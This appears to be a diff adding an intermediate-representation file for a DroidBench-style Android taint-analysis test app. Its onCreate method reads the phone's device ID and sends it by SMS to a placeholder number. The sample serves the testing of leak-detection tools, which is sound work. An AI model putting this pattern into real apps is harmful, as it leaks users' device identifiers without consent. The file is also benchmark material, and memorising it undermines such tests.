@@ -1,0 +1,36 @@
+record `de.ecspride.MainActivity` @kind class @AccessFlag PUBLIC extends `android.app.Activity` @kind class {
+}
+procedure `void` `<init>`(`de.ecspride.MainActivity` v0 @kind this) @signature `Lde/ecspride/MainActivity;.<init>:()V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+
+  #L026e1c.  call `<init>`(v0) @signature `Landroid/app/Activity;.<init>:()V` @kind direct;
+  #L026e22.  return @kind void;
+}
+procedure `void` `onCreate`(`de.ecspride.MainActivity` v7 @kind this, `android.os.Bundle` v8 @kind object @name `savedInstanceState`) @signature `Lde/ecspride/MainActivity;.onCreate:(Landroid/os/Bundle;)V` @AccessFlag PROTECTED {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L026e34.  v2:= 0I;
+  #L026e36.  call `onCreate`(v7, v8) @signature `Landroid/app/Activity;.onCreate:(Landroid/os/Bundle;)V` @kind super;
+  #L026e3c.  v1:= 2130903040I;
+  #L026e40.  call `setContentView`(v7, v1) @signature `Lde/ecspride/MainActivity;.setContentView:(I)V` @kind virtual;
+  #L026e46.  v1:= "phone" @kind object;
+  #L026e4a.  call temp:= `getSystemService`(v7, v1) @signature `Lde/ecspride/MainActivity;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L026e50.  v6:= temp @kind object;
+  #L026e52.  v6:= (`android.telephony.TelephonyManager`) v6 @kind object;
+  #L026e56.  call temp:= `getDefault`() @signature `Landroid/telephony/SmsManager;.getDefault:()Landroid/telephony/SmsManager;` @kind static;
+  #L026e5c.  v0:= temp @kind object;
+  #L026e5e.  v1:= "+49 1234" @kind object;
+  #L026e62.  call temp:= `getDeviceId`(v6) @signature `Landroid/telephony/TelephonyManager;.getDeviceId:()Ljava/lang/String;` @kind virtual;
+  #L026e68.  v3:= temp @kind object;
+  #L026e6a.  v4:= v2 @kind object;
+  #L026e6c.  v5:= v2 @kind object;
+  #L026e6e.  call `sendTextMessage`(v0, v1, v2, v3, v4, v5) @signature `Landroid/telephony/SmsManager;.sendTextMessage:(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V` @kind virtual;
+  #L026e74.  return @kind void;
+}
